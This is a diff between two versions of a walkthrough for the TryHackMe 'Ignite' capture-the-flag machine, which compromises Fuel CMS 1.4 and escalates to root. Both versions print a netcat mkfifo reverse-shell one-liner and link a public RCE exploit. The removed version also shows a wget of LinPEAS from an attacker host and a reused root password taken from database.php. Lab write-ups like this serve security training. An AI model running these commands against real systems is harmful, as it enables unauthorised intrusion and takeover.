@@ -1,182 +1,77 @@
-# 🔥 TryHackMe — Ignite
+Ignite CTF – Full Walkthrough
 
-> **Difficulty:** Easy | **OS:** Linux | **Category:** Web / Privilege Escalation
-> **Author:** Aryan Barkhordar
+Author: gl1tcH
+Difficulty: Easy
 
----
+1. Initial Enumeration
 
-## Table of Contents
+I began by performing a full port scan using Nmap to identify exposed services on the target machine. The results showed an HTTP service running on port 80, and the service banner indicated it was Fuel CMS.
 
-- [Overview](#overview)
-- [Reconnaissance](#reconnaissance)
-  * [Port Scanning](#port-scanning)
-  * [Web Enumeration](#web-enumeration)
-- [Exploitation](#exploitation)
-  * [Fuel CMS 1.4 — Remote Code Execution](#fuel-cms-14--remote-code-execution)
-  * [Reverse Shell](#reverse-shell)
-- [Post-Exploitation](#post-exploitation)
-  * [User Flag](#user-flag)
-- [Privilege Escalation](#privilege-escalation)
-  * [Automated Enumeration — LinPEAS](#automated-enumeration--linpeas)
-  * [Database Configuration — Credential Reuse](#database-configuration--credential-reuse)
-  * [Root Access via `su`](#root-access-via-su)
-- [Flags](#flags)
-- [Summary](#summary)
+<img width="761" height="337" alt="Nmap Scan" src="https://github.com/user-attachments/assets/90fd4d78-c10b-495a-8fc1-3855a7b58806" />
 
----
+2. Inspecting the Web Application
 
-## Overview
+After browsing to the HTTP service, I confirmed the application was running Fuel CMS version 1.4.
 
-**Ignite** is a TryHackMe machine built around a known CMS vulnerability. An `nmap` scan exposes HTTP on port 80, identifying the web application as **Fuel CMS version 1.4** — a content management system with a well-documented Remote Code Execution vulnerability. Initial access is gained via a public Python exploit that achieves unauthenticated RCE. Post-exploitation reveals database credentials in a PHP configuration file, which are then reused to escalate directly to root via `su`.
+<img width="1909" height="872" alt="Fuel_CMS_Web" src="https://github.com/user-attachments/assets/32896fa3-d11d-4dff-ad98-b2cf7d79a2e8" />
 
----
+3. Identifying and Executing an Exploit (RCE)
 
-## Reconnaissance
+A quick search revealed that Fuel CMS 1.4 is vulnerable to Remote Code Execution (RCE).
+I located a publicly available exploit written in Python and used it to gain RCE on the server. (https://github.com/Errahulaws/fuel-cms-1.4-RCA-exploit)
 
-### Port Scanning
+<img width="1919" height="800" alt="Fuel_RCE_github" src="https://github.com/user-attachments/assets/61c7d287-d7eb-4828-8b9a-146b7f8bf58c" />
+<img width="202" height="230" alt="RCE_Conf" src="https://github.com/user-attachments/assets/c53a549c-293b-439d-a3b5-100b6c984b29" />
 
-An initial `nmap` scan identified a single open port:
+4. Obtaining a Reverse Shell
 
-```
-PORT   STATE SERVICE
-80/tcp open  http
-```
+With RCE confirmed, I executed a reverse shell payload to gain an interactive shell on the target:
 
-> **Key Finding:** The HTTP service banner exposed the application as **Fuel CMS** — a versioned CMS with publicly known vulnerabilities.
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc [IP ADDR] [PORT] >/tmp/f
 
----
+I set up a Netcat listener on my machine and successfully received a shell.
 
-### Web Enumeration
+<img width="530" height="212" alt="Rev_shell" src="https://github.com/user-attachments/assets/1c2a83e0-31b9-43ee-91b7-9c061a243004" />
 
-Navigating to `http://<TARGET>` confirmed the application was running **Fuel CMS version 1.4**. The landing page displayed the default CMS installation page, including the software name and version.
+5. Capturing the User Flag
 
-> **Key Finding:** The version string `Fuel CMS 1.4` was visible on the default page — this is sufficient to identify the applicable CVE without further enumeration.
+Once inside the machine, I enumerated the filesystem and located the first user flag.
+I was able to read and submit it.
 
----
+<img width="130" height="97" alt="first_flag" src="https://github.com/user-attachments/assets/db745451-bc86-4e6d-a038-dba2ea85e49a" />
 
-## Exploitation
+6. Privilege Escalation – Enumeration with LinPEAS
 
-### Fuel CMS 1.4 — Remote Code Execution
+To escalate privileges, I uploaded and executed LinPEAS, a Linux enumeration tool that highlights potential attack vectors.
 
-A search for known vulnerabilities in Fuel CMS 1.4 confirmed the presence of an unauthenticated Remote Code Execution vulnerability, exploitable via a crafted request to the `fuel/pages/select/` endpoint.
+LinPEAS output revealed a particularly interesting line:
 
-A public Python exploit was identified and cloned:
+<img width="646" height="47" alt="linpeas_output" src="https://github.com/user-attachments/assets/395cd4e1-61cd-4d4a-89d2-7de434d92523" />
 
-```
-git clone https://github.com/Errahulaws/fuel-cms-1.4-RCA-exploit
-```
+7. Investigating the Database Configuration File
 
-The exploit was executed against the target, confirming code execution on the server — arbitrary OS commands could be issued and their output was returned in the HTTP response.
+I examined the database.php file manually and found the full database connection array.
+Crucially, the username was set to root, and the password was the same one discovered by LinPEAS:
 
----
+<img width="441" height="348" alt="database_passwd" src="https://github.com/user-attachments/assets/97351c3c-a55d-4062-b7b3-be63deda7431" />
 
-### Reverse Shell
+This indicated that the root user on the system might reuse the same credentials.
 
-With RCE confirmed, a reverse shell payload was injected to obtain an interactive session:
+8. Privilege Escalation to Root
 
-```
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER IP> 4444 >/tmp/f
-```
+I attempted to switch to the root user using:
 
-A Netcat listener was established prior to execution:
+"su root"
 
-```
-nc -lvnp 4444
-```
+When prompted, I entered the password mememe, and access was granted.
+This elevated me to full root privileges.
 
-The payload executed successfully and a reverse shell was received, providing a session on the target as `www-data`.
+<img width="276" height="52" alt="login_root1" src="https://github.com/user-attachments/assets/1210b23b-277f-41cd-9c40-959ae8e8fa0c" />
+<img width="141" height="16" alt="login_root2" src="https://github.com/user-attachments/assets/da111238-2db4-41da-9e36-8065cdbbadf2" />
 
----
+9. Capturing the Root Flag
 
-## Post-Exploitation
+With root access, I navigated to the root directory and retrieved the root.txt flag to complete the challenge.
 
-### User Flag
+<img width="296" height="17" alt="rootflag" src="https://github.com/user-attachments/assets/72e9326a-9416-4ddb-80a5-c98995491b89" />
 
-With an active shell, the filesystem was explored. The user flag was located at:
-
-```
-/home/www-data/user.txt
-```
-
-```
-$ cat /home/www-data/user.txt
-THM{REDACTED}
-```
-
----
-
-## Privilege Escalation
-
-### Automated Enumeration — LinPEAS
-
-LinPEAS was transferred to the target and executed:
-
-```
-wget http://<ATTACKER>:8000/linpeas.sh -O /tmp/linpeas.sh
-chmod +x /tmp/linpeas.sh
-/tmp/linpeas.sh
-```
-
-The output highlighted a notable finding within the web application's configuration directory — a PHP file containing plaintext database credentials.
-
----
-
-### Database Configuration — Credential Reuse
-
-The flagged file was manually inspected:
-
-```
-cat /var/www/html/fuel/application/config/database.php
-```
-
-The database connection array revealed:
-
-```php
-'username' => 'root',
-'password' => 'mememe',
-```
-
-> **Key Observation:** The database was configured to connect as `root` with a simple plaintext password. This raised the possibility that the system's root account reused the same password.
-
----
-
-### Root Access via `su`
-
-The discovered credential was tested against the system's root account:
-
-```
-su root
-Password: mememe
-```
-
-Access was granted immediately, elevating the session to full root privileges. The root flag was then retrieved:
-
-```
-# cat /root/root.txt
-THM{REDACTED}
-```
-
----
-
-## Flags
-
-| Flag        | Value           |
-| ----------- | --------------- |
-| 🏳️ **User** | `THM{REDACTED}` |
-| 🚩 **Root**  | `THM{REDACTED}` |
-
----
-
-## Summary
-
-| Stage                    | Technique                                                                    |
-| ------------------------ | ---------------------------------------------------------------------------- |
-| **Recon**                | `nmap` port scan, version fingerprinting via HTTP banner                     |
-| **Initial Access**       | Fuel CMS 1.4 RCE — public Python exploit                                     |
-| **Shell**                | mkfifo reverse shell → Netcat listener                                       |
-| **Enumeration**          | LinPEAS highlights plaintext credentials in `database.php`                   |
-| **Privilege Escalation** | Database password reused for root system account → `su root`                 |
-
----
-
-*Writeup by Aryan Barkhordar*
